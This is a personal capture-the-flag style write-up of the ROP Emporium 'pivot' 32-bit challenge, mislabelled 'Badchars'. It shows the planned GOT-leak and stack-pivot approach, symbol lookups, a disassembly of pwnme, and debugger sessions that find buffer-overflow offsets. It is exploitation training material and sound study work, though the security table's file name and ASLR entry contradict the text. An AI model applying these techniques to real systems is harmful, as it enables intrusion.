# Badchars

Objective:

Basically same as ret2win challenge but ret2win function found within dynamically linked library + stack not enough space, need to use given stack pivot. First payload would be running the foothold_function from plt table which then populates the got table for the foothold_function. Then we print the foothold_function within the got table which gives us the address of the foothold_function within the library with the offset. More on got and plt table [here](https://reverseengineering.stackexchange.com/questions/1992/what-is-plt-got). More on stack pivot [here](https://failingsilently.wordpress.com/2018/04/17/what-is-a-stack-pivot/). From debugging (and other writeups lol), we observe that we are pivoting into the heap. Using rabin or readelf, we know the offset and hence can derive the address of the base location of the library, which allows us to find out the address of the ret2win function, which always changes given that ASLR is enabled as seen in the [ROP Emporium Guide](https://ropemporium.com/guide.html). In our second payload, which is susceptible to buffer overflow but has limited space as you will see in the analysis, we need to overflow the buffer and set the return pointer to the stack pivot before extracting the location of ret2win. Because the return function is the main function, the main function will re-run and you will send a third payload which will then run the ret2win function.

Security:

|RELRO|STACK CANARY|NX|PIE|RPATH|RUNPATH|Symbols|FORTIFY|Fortified|Fortifiable|FILE|ASLR|
|-|-|-|-|-|-|-|-|-|-|-|-|
|Partial RELRO|No canary found|NX enabled|No PIE|No RPATH|No RUNPATH|72) Symbols|No|0|3|ret2win32|ASLR Disabled|

### 32 Bit Analysis

```
┌──(george93㉿kali)-[~/…/osed-prep/ROPEmporium/pivot/pivot32]
└─$ readelf -s libpivot32.so 

    51: 00000974   164 FUNC    GLOBAL DEFAULT   12 ret2win

┌──(george93㉿kali)-[~/…/osed-prep/ROPEmporium/pivot/pivot32]
└─$ rabin2 -s libpivot32.so    

    18  0x00000974 0x00000974 GLOBAL FUNC   164      ret2win

                                                                                                                                                                                                               
┌──(george93㉿kali)-[~/…/osed-prep/ROPEmporium/pivot/pivot32]
└─$ ldd pivot32
	linux-gate.so.1 (0xf7fc9000)
	libpivot32.so => ./libpivot32.so (0xf7fc0000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7db6000)
	/lib/ld-linux.so.2 (0xf7fcb000)
```

```
pwndbg> disas pwnme
Dump of assembler code for function pwnme:
   0x08048750 <+0>:	push   ebp
   0x08048751 <+1>:	mov    ebp,esp
   0x08048753 <+3>:	sub    esp,0x28
   0x08048756 <+6>:	sub    esp,0x4
   0x08048759 <+9>:	push   0x20
   0x0804875b <+11>:	push   0x0
   0x0804875d <+13>:	lea    eax,[ebp-0x28]
   0x08048760 <+16>:	push   eax
   0x08048761 <+17>:	call   0x8048550 <memset@plt>
   0x08048766 <+22>:	add    esp,0x10
   0x08048769 <+25>:	sub    esp,0xc
   0x0804876c <+28>:	push   0x804890d
   0x08048771 <+33>:	call   0x8048500 <puts@plt>
   0x08048776 <+38>:	add    esp,0x10
   0x08048779 <+41>:	sub    esp,0x8
   0x0804877c <+44>:	push   DWORD PTR [ebp+0x8]
   0x0804877f <+47>:	push   0x804892c
   0x08048784 <+52>:	call   0x80484d0 <printf@plt>
   0x08048789 <+57>:	add    esp,0x10
   0x0804878c <+60>:	sub    esp,0xc
   0x0804878f <+63>:	push   0x8048968
   0x08048794 <+68>:	call   0x8048500 <puts@plt>
   0x08048799 <+73>:	add    esp,0x10
   0x0804879c <+76>:	sub    esp,0xc
   0x0804879f <+79>:	push   0x8048994
   0x080487a4 <+84>:	call   0x80484d0 <printf@plt>
   0x080487a9 <+89>:	add    esp,0x10
   0x080487ac <+92>:	sub    esp,0x4
   0x080487af <+95>:	push   0x100
   0x080487b4 <+100>:	push   DWORD PTR [ebp+0x8]
   0x080487b7 <+103>:	push   0x0
   0x080487b9 <+105>:	call   0x80484c0 <read@plt>
   0x080487be <+110>:	add    esp,0x10
   0x080487c1 <+113>:	sub    esp,0xc
   0x080487c4 <+116>:	push   0x8048997
   0x080487c9 <+121>:	call   0x8048500 <puts@plt>
   0x080487ce <+126>:	add    esp,0x10
   0x080487d1 <+129>:	sub    esp,0xc
   0x080487d4 <+132>:	push   0x80489a4
   0x080487d9 <+137>:	call   0x8048500 <puts@plt>
   0x080487de <+142>:	add    esp,0x10
   0x080487e1 <+145>:	sub    esp,0xc
   0x080487e4 <+148>:	push   0x8048994
   0x080487e9 <+153>:	call   0x80484d0 <printf@plt>
   0x080487ee <+158>:	add    esp,0x10
   0x080487f1 <+161>:	sub    esp,0x4
   0x080487f4 <+164>:	push   0x38
   0x080487f6 <+166>:	lea    eax,[ebp-0x28]
   0x080487f9 <+169>:	push   eax
   0x080487fa <+170>:	push   0x0
   0x080487fc <+172>:	call   0x80484c0 <read@plt>
   0x08048801 <+177>:	add    esp,0x10
   0x08048804 <+180>:	sub    esp,0xc
   0x08048807 <+183>:	push   0x80489c5
   0x0804880c <+188>:	call   0x8048500 <puts@plt>
   0x08048811 <+193>:	add    esp,0x10
   0x08048814 <+196>:	nop
   0x08048815 <+197>:	leave  
   0x08048816 <+198>:	ret    
End of assembler dump.
```

- read() function should be the function which receives our inputs. read() takes in 3 parameters as seen [here](https://man7.org/linux/man-pages/man2/read.2.html). For first read, it should be read(0x0, [ebp+0x8], 0x100). For second read, it should be read(0x0, eax, 0x38).

```
pwndbg> r
Starting program: /home/george93/Desktop/offsec-prep/osed-prep/ROPEmporium/pivot/pivot32/pivot32 
pivot by ROP Emporium
x86

Call ret2win() from libpivot
The Old Gods kindly bestow upon you a place to pivot: 0xf7db4f10
Send a ROP chain now and it will land there
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ
Thank you!

Now please send your stack smash
> Thank you!

Program received signal SIGSEGV, Segmentation fault.
0x58585858 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────
 EAX  0xb
 EBX  0x0
 ECX  0xffffffff
 EDX  0xffffffff
 EDI  0x8048570 (_start) ◂— xor    ebp, ebp
 ESI  0x1
 EBP  0x57575757 ('WWWW')
 ESP  0xffffcdb0 ◂— 0x59595959 ('YYYY')
 EIP  0x58585858 ('XXXX')
──────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────
Invalid address 0x58585858










───────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────
00:0000│ esp 0xffffcdb0 ◂— 0x59595959 ('YYYY')
01:0004│     0xffffcdb4 ◂— 0x5a5a5a5a ('ZZZZ')
02:0008│     0xffffcdb8 ◂— 0x2
03:000c│     0xffffcdbc ◂— 0x0
04:0010│     0xffffcdc0 ◂— 0x1
05:0014│     0xffffcdc4 —▸ 0xffffce94 —▸ 0xffffd086 ◂— '/home/george93/Desktop/offsec-prep/osed-prep/ROPEmporium/pivot/pivot32/pivot32'
06:0018│     0xffffcdc8 —▸ 0xf7db4f10 ◂— 0x41414141 ('AAAA')
07:001c│     0xffffcdcc —▸ 0xf6db5010 ◂— 0x0
─────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────
 ► f 0 0x58585858
   f 1 0x59595959
   f 2 0x5a5a5a5a
   f 3      0x2
   f 4      0x0
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ
Undefined command: "ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ".  Try "help".
pwndbg> 
```

- Observe that when we perform the buffer overflow on the second input, the stack is only overflowed with 'YYYYZZZZ'. This makes sense as the padding is 26 * 2 * 4 (208) + 23 * 4, the eip register takes up 4 bytes and the overflowed buffer in the stack takes up 8 bytes, which sums up to 312 bytes which is 0x138 in hexadecimals which is close yet not so close to 0x100

```
pwndbg> r
Starting program: /home/george93/Desktop/offsec-prep/osed-prep/ROPEmporium/pivot/pivot32/pivot32 
pivot by ROP Emporium
x86

Call ret2win() from libpivot
The Old Gods kindly bestow upon you a place to pivot: 0xf7db4f10
Send a ROP chain now and it will land there
> a
Thank you!

Now please send your stack smash
> AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT
Thank you!

Program received signal SIGSEGV, Segmentation fault.
0x4c4c4c4c in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────
 EAX  0xb
 EBX  0x0
 ECX  0xffffffff
 EDX  0xffffffff
 EDI  0x8048570 (_start) ◂— xor    ebp, ebp
 ESI  0x1
 EBP  0x4b4b4b4b ('KKKK')
 ESP  0xffffcdb0 ◂— 0x4d4d4d4d ('MMMM')
 EIP  0x4c4c4c4c ('LLLL')
──────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────
Invalid address 0x4c4c4c4c










───────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────
00:0000│ esp 0xffffcdb0 ◂— 0x4d4d4d4d ('MMMM')
01:0004│     0xffffcdb4 ◂— 0x4e4e4e4e ('NNNN')
02:0008│     0xffffcdb8 ◂— 0x2
03:000c│     0xffffcdbc ◂— 0x0
04:0010│     0xffffcdc0 ◂— 0x1
05:0014│     0xffffcdc4 —▸ 0xffffce94 —▸ 0xffffd086 ◂— '/home/george93/Desktop/offsec-prep/osed-prep/ROPEmporium/pivot/pivot32/pivot32'
06:0018│     0xffffcdc8 —▸ 0xf7db4f10 ◂— 0xa61 /* 'a\n' */
07:001c│     0xffffcdcc —▸ 0xf6db5010 ◂— 0x0
─────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────
 ► f 0 0x4c4c4c4c
   f 1 0x4d4d4d4d
   f 2 0x4e4e4e4e
   f 3      0x2
   f 4      0x0
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> OOOOPPPPQQQQRRRRSSSSTTTT
```

- Observe that when we perform the buffer overflow on the second input, the stack is only overflowed with 'MMMMNNNN'. This makes sense as the padding is 11 * 4, the eip register takes up 4 bytes and the overflowed buffer in the stack takes up 8 bytes, which sums up to 56 bytes which is 0x38 in hexadecimals, close to 0x34
